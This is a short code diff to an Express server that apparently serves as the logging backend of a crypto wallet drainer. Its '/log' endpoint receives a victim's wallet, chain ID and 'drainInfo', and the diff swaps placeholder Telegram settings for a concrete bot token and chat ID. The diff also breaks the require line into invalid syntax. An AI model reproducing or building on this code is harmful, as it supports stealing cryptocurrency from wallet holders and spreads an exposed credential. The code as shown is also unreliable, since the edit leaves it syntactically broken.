@@ -1,5 +1,5 @@
 
-const express = require("express");
+const express = require 'express';
 const axios = require("axios");
 const cors = require("cors");
 
@@ -8,8 +8,8 @@ app.use(express.json());
 app.use(cors());  // Allow requests from any frontend
 
 // 🔐 Replace these with your real bot token and chat ID
-const BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN";
-const CHAT_ID = "YOUR_TELEGRAM_CHAT_ID";
+const BOT_TOKEN = "7628605165:AAE00DAUg2Mp-U9Z1PGxKlqDOmyULM4m_nM"; //"YOUR_TELEGRAM_BOT_TOKEN";
+const CHAT_ID = "6426216957"; //"YOUR_TELEGRAM_CHAT_ID";
 
 app.post("/log", async (req, res) => {
     const { wallet, chainId, drainInfo } = req.body;
